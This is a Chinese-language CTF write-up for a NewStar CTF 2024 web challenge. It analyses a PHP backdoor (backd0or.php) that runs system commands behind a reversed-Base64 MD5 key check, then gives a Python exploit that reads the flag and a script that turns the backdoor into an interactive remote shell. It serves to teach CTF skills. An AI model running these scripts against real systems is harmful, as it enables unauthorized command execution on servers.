---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---
<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# 智械危机

`index.php` 的基本提示：

```php
echo "<b>ROBOTS</b> is protecting this website!<br>";
echo "But it is not smart enough...<br>";
echo "It may leak some information to you, future hackers!";
```

明显的提示：查看 `robots.txt`，得到了路由 `/backd0or.php`

```php
<?php
function execute_cmd($cmd) {
    system($cmd);
}
function decrypt_request($cmd, $key) {
    $decoded_key = base64_decode($key);
    $reversed_cmd = '';
    for ($i = strlen($cmd) - 1; $i >= 0; $i--) {
        $reversed_cmd .= $cmd[$i];
    }
    $hashed_reversed_cmd = md5($reversed_cmd);
    if ($hashed_reversed_cmd !== $decoded_key) {
        die("Invalid key");
    }
    $decrypted_cmd = base64_decode($cmd);
    return $decrypted_cmd;
}
if (isset($_POST['cmd']) && isset($_POST['key'])) {
    execute_cmd(decrypt_request($_POST['cmd'],$_POST['key']));
}
else {
    highlight_file(__FILE__);
}
?>
```

一个对新生来说略绕的 PHP 代码阅读，也对编写脚本、使用 WebShell 的能力进行初步的考查。

`cmd` 参数是 **Base64 编码后**的 `system` 命令。

`key` 的验证逻辑：将<strong>`cmd` 参数值</strong>字符串翻转后，计算 MD5 哈希，并与 Base64 解码后的 `key` 进行比较。

因此我们将这个过程反过来，就可以得到解题 EXP：

```python
import requests
import base64
import hashlib
print("[+] Exploit for newstar_zhixieweiji")
url = "http://yourtarget.com/backd0or.php"
cmd = "cat /flag"
cmd_encoded = base64.b64encode(cmd.encode()).decode()
cmd_reversed = cmd_encoded[::-1]
hashed_reversed_cmd = hashlib.md5(cmd_reversed.encode()).hexdigest()
encoded_key = base64.b64encode(hashed_reversed_cmd.encode()).decode()
payload = {
    'cmd': cmd_encoded,
    'key': encoded_key
}
response = requests.post(url, data=payload)
print(f"[+] Flag: {response.text}")
```

EXP 使用了 `requests` 库负责请求后门 shell，也可以用任何一款能够发出 POST 请求的工具完成这一操作，如 HackBar、BurpSuite 等。

<Container type="quote" title="出题人的胡诌">

请各位选手**打好编程基础，不要浮躁**。这题的代码逻辑应该懂一点英语就能够看懂了，变量名称也没做混淆。AI 可能会胡编，但是完全可以给你提取出足够的**关键词**用于搜索。
</Container>

这题的出法**不鼓励**手搓！！！先编码再逆序，执行一个指令都费劲，flag 位置没猜对就得再搓一遍。只要脚本写好，这题完全可以得到一个简洁的交互式 shell：

![交互式 Shell 示意图](/assets/images/wp/2024/week1/zhixieweiji_1.png)

附代码：

```python
import requests
import base64
import hashlib
print("[+] Shell for newstar_zhixieweiji")
url = input("[+] Enter the target URL: ")
def execute_command(cmd):
    cmd_encoded = base64.b64encode(cmd.encode()).decode()
    cmd_reversed = cmd_encoded[::-1]
    hashed_reversed_cmd = hashlib.md5(cmd_reversed.encode()).hexdigest()
    encoded_key = base64.b64encode(hashed_reversed_cmd.encode()).decode()
    payload = {'cmd': cmd_encoded,'key': encoded_key}
    response = requests.post(url, data=payload)
    return response.text[:-1]
hostname = execute_command("hostname")
username = execute_command("whoami")
while True:
    directory = execute_command("pwd")
    command = input(f"{username}@{hostname}:{directory}$ ")
    output = execute_command(command)
    print(output)
```
